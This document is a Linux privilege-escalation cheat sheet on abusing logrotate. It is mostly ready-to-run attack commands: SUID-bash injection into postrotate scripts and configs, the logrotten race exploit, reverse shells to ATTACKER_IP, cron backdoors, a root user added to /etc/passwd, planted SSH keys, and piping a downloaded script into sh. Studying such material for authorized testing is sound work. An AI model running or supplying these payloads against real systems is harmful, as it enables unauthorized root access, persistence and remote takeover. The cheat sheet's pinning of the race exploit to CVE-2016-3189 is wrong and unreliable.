# Logrotate Privilege Escalation — Cheat Sheet

> **Scope:** Techniques for abusing logrotate misconfigurations and vulnerabilities to escalate privileges on Linux systems. For authorized penetration testing and CTF use only.

---

## 1. Logrotate Basics

```bash
# Config files location
/etc/logrotate.conf          # main config
/etc/logrotate.d/            # per-application configs

# Manual run (as root via cron or systemd timer)
logrotate /etc/logrotate.conf
logrotate -f /etc/logrotate.conf    # force rotation
logrotate -d /etc/logrotate.conf    # debug/dry-run (no changes)
logrotate -v /etc/logrotate.conf    # verbose

# Check logrotate version (critical for CVE)
logrotate --version

# Cron job (typical trigger)
cat /etc/cron.daily/logrotate
cat /etc/cron.hourly/logrotate
systemctl list-timers | grep logrotate
```

---

## 2. Reconnaissance

```bash
# Find logrotate configs
find /etc/logrotate.d/ -type f
cat /etc/logrotate.conf
cat /etc/logrotate.d/*

# Find log directories owned or writable by current user
find /var/log -writable -type d 2>/dev/null
find /var/log -user $(whoami) 2>/dev/null

# Check log files writable by current user
find /var/log -writable -type f 2>/dev/null

# Find logrotate state file
cat /var/lib/logrotate/status
cat /var/lib/logrotate.status

# Check if logrotate runs as root in cron
grep -r logrotate /etc/cron* /var/spool/cron* 2>/dev/null
systemctl cat logrotate.timer 2>/dev/null
```

---

## 3. Core Attack Vectors

### Vector Overview

| Vector | Requirement | Difficulty |
|---|---|---|
| Writable log file/dir + `create`/`postrotate` | Write access to log dir | Low |
| `postrotate` script injection | Write access to config | Low |
| CVE-2016-3189 / logrotten | Write to log file being rotated | Medium |
| Race condition on `copytruncate` | Write to log file | Medium |
| Writable `/etc/logrotate.d/` | Write to config dir | Low |
| Symlink attack on rotated log | Write to log dir | Medium |

---

## 4. Writable Log Directory Abuse

If you own or can write to the directory a log file rotates in, logrotate (running as root) will create new files as root — you can control their content or permissions.

```bash
# Check write access to log directories referenced in configs
grep -r "^/var/log" /etc/logrotate.d/

# If /var/log/myapp/ is writable:
ls -la /var/log/myapp/

# Logrotate renames: myapp.log → myapp.log.1
# Then creates a new myapp.log (owned root by default)
# BUT with "create 0666 root root" → world-writable

# Look for permissive "create" directives
grep -r "create" /etc/logrotate.d/
# e.g. "create 0644 www-data www-data" — if you are www-data, you own new log
```

---

## 5. `postrotate` Script Injection

If you can write to an `/etc/logrotate.d/` config file or the script it calls:

```bash
# Find writable config files
find /etc/logrotate.d/ -writable 2>/dev/null
ls -la /etc/logrotate.d/

# Find postrotate scripts called by logrotate
grep -r "postrotate\|prerotate\|firstaction\|lastaction" /etc/logrotate.d/

# Example vulnerable config:
# postrotate
#     /usr/lib/myapp/rotate.sh
# endscript

# If rotate.sh is writable:
ls -la /usr/lib/myapp/rotate.sh

# Inject reverse shell or SUID bash
echo '#!/bin/bash' > /usr/lib/myapp/rotate.sh
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >> /usr/lib/myapp/rotate.sh

# Wait for logrotate to run (cron), then:
/tmp/bash -p   # -p preserves EUID (root)
```

### Inject Directly Into Config

```bash
# If /etc/logrotate.d/myapp is writable
cat >> /etc/logrotate.d/myapp << 'EOF'
    postrotate
        cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
    endscript
EOF

# After cron triggers logrotate:
/tmp/rootbash -p
```

---

## 6. CVE-2016-3189 — logrotten Exploit

Affects logrotate **< 3.14.0** with `create` option enabled.

**Mechanism:** Race condition — logrotate moves the log file, then creates a new one. Between these two operations, an attacker can replace the new file with a symlink pointing to an arbitrary location (e.g., `/etc/cron.d/`).

### Setup & Exploit

```bash
# Check version
logrotate --version
# Vulnerable: logrotate 3.8.x – 3.13.x

# Download logrotten exploit
git clone https://github.com/whotwagner/logrotten.git
cd logrotten

# Compile
gcc -o logrotten logrotten.c

# Create payload (reverse shell)
cat > /tmp/payload << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod +x /tmp/payload

# Run exploit against a log file you can write to
# Syntax: ./logrotten -p <payload> <logfile>
./logrotten -p /tmp/payload /var/log/myapp/myapp.log

# In another terminal — trigger rotation by writing to the log
echo "aaaa" >> /var/log/myapp/myapp.log

# Listener on attacker machine
nc -lvnp 4444
```

### logrotten with `compress` Option

```bash
# If config uses "compress", use -c flag
./logrotten -p /tmp/payload -c /var/log/myapp/myapp.log
```

### What logrotten Does Internally

```
1. Monitors the log file being rotated
2. The moment logrotate renames log → log.1, logrotten acts
3. Creates a symlink: log → /etc/cron.d/pwned   (or other root-owned path)
4. Logrotate creates new "log" (follows symlink) → writes payload to /etc/cron.d/pwned
5. Cron executes the payload as root
```

---

## 7. `copytruncate` Race Condition

When `copytruncate` is used, logrotate:
1. Copies the log to `log.1`
2. Truncates the original log to zero

Between steps 1 and 2, you can replace the log with a symlink.

```bash
# Look for copytruncate in configs
grep -r "copytruncate" /etc/logrotate.d/

# If found and you have write access to log directory:
# Race: after copy, before truncate → replace log with symlink
ln -sf /etc/passwd /var/log/myapp/myapp.log

# Logrotate will truncate /etc/passwd (DoS) or append to it
# More useful: symlink to a cron file
ln -sf /etc/cron.d/backdoor /var/log/myapp/myapp.log
# Then write payload via the log
echo "* * * * * root /tmp/shell.sh" > /var/log/myapp/myapp.log
```

---

## 8. Symlink Attack on Rotated Log

If logrotate renames `log` → `log.1` as root, and you control the directory:

```bash
# Pre-create log.1 as a symlink to a sensitive file
ln -sf /etc/cron.d/evil /var/log/myapp/myapp.log.1

# Logrotate will follow the symlink and rename/overwrite the target
# Then create a new log file
# Depending on nocreatesymlink / nosymlinks settings, this may work
```

```bash
# Check for symlink-related options in config
grep -rE "nosymlinks|nocreatesymlinks" /etc/logrotate.conf /etc/logrotate.d/
# Absence of "nosymlinks" = symlink attacks possible
```

---

## 9. Abusing `su` Directive

The `su` directive runs logrotate scripts as a specific user:

```bash
# Look for su directives
grep -r "^\s*su " /etc/logrotate.d/

# Example:
# su www-data www-data
# This means postrotate scripts run as www-data
# If you ARE www-data, you control those scripts
```

---

## 10. Abusing `sharedscripts` + Multiple Log Paths

```bash
# sharedscripts = postrotate runs ONCE for all matching logs
# If you can inject one of the log paths → control when script runs

grep -r "sharedscripts" /etc/logrotate.d/

# Check if any of the log globs match paths you control
# e.g. /var/log/myapp/*.log — if you can create files here
```

---

## 11. World-Writable `/etc/logrotate.d/`

```bash
# Check directory permissions
ls -la /etc/logrotate.d/

# If writable (rare but happens):
# Drop a new config file that runs arbitrary commands
cat > /etc/logrotate.d/evil << 'EOF'
/var/log/syslog {
    daily
    rotate 1
    postrotate
        cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash
    endscript
}
EOF

# Wait for cron, then:
/tmp/rootbash -p
```

---

## 12. Payload Examples

### SUID Bash

```bash
cp /bin/bash /tmp/bash && chmod +s /tmp/bash
# Execute:
/tmp/bash -p
```

### Reverse Shell

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

### Add Root User to `/etc/passwd`

```bash
echo 'r00t:$(openssl passwd -1 pass123):0:0:root:/root:/bin/bash' >> /etc/passwd
```

### Cron Backdoor

```bash
echo "* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > /etc/cron.d/backdoor
```

### Write SSH Key

```bash
mkdir -p /root/.ssh
echo "ssh-rsa AAAA...YOUR_KEY..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

---

## 13. Triggering Logrotate Without Waiting for Cron

```bash
# If you can run logrotate directly (rare)
sudo logrotate -f /etc/logrotate.conf

# Trigger via large log file (size-based rotation)
# Find size threshold in config
grep -r "size\|minsize\|maxsize" /etc/logrotate.d/

# Fill the log to trigger rotation
python3 -c "print('A'*1024*1024*100)" >> /var/log/myapp/myapp.log

# Alternatively, trigger via signal if application supports it
kill -USR1 $(pgrep myapp)
```

---

## 14. Config Directive Reference

| Directive | Description | Attack Relevance |
|---|---|---|
| `create <mode> <user> <group>` | Sets permissions on new log file | Permissive mode = writable by attacker |
| `postrotate / endscript` | Script run after rotation | Inject commands if script/config is writable |
| `prerotate / endscript` | Script run before rotation | Same as above |
| `copytruncate` | Copy then truncate original | Race condition → symlink swap |
| `compress` | Compress rotated logs | Affects logrotten timing |
| `sharedscripts` | Run script once for all logs | Control via glob match |
| `su <user> <group>` | Run scripts as this user | If you're that user, scripts are yours |
| `nocreate` | Don't create new log file | Prevents new file creation |
| `nosymlinks` | Don't follow symlinks | Blocks symlink attacks when present |
| `missingok` | Don't error if log missing | Lets you pre-create log as symlink |
| `firstaction / lastaction` | Wrapper scripts | Same injection vector as postrotate |

---

## 15. Automated Tools

```bash
# linpeas — detects logrotate misconfigs automatically
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# logrotten exploit
git clone https://github.com/whotwagner/logrotten

# pspy — monitor processes without root (watch logrotate run)
./pspy64
# Look for: /usr/sbin/logrotate

# find writable log dirs quickly
find /var/log -writable -type d 2>/dev/null
find /etc/logrotate.d -writable 2>/dev/null
```

---

## 16. Quick Checklist

- [ ] `logrotate --version` — check for CVE-2016-3189 (< 3.14.0)
- [ ] Writable files in `/etc/logrotate.d/`
- [ ] Writable log **directories** referenced in configs
- [ ] `postrotate` / `prerotate` scripts writable
- [ ] `copytruncate` directive → race condition
- [ ] No `nosymlinks` directive → symlink attacks viable
- [ ] `create` directive with permissive mode (0666, 0777)
- [ ] `su` directive matching current user
- [ ] Logrotate runs in cron as root → confirm with `pspy`
- [ ] Log file size — can you trigger rotation on demand?

---

## 17. Full Attack Scenario (Example)

```bash
# 1. Identify logrotate config
cat /etc/logrotate.d/nginx
#   /var/log/nginx/*.log {
#       daily
#       postrotate
#           /usr/share/nginx/rotate.sh
#       endscript
#   }

# 2. Check if rotate.sh is writable
ls -la /usr/share/nginx/rotate.sh
# -rwxrwxr-x root root → writable!

# 3. Inject payload
echo '#!/bin/bash' > /usr/share/nginx/rotate.sh
echo 'cp /bin/bash /tmp/r && chmod +s /tmp/r' >> /usr/share/nginx/rotate.sh

# 4. Monitor for logrotate execution
./pspy64 | grep logrotate

# 5. After cron triggers logrotate:
/tmp/r -p
# root shell achieved
```

---

*References: logrotten (whotwagner), HackTricks, PayloadsAllTheThings, NVD CVE-2016-3189.*
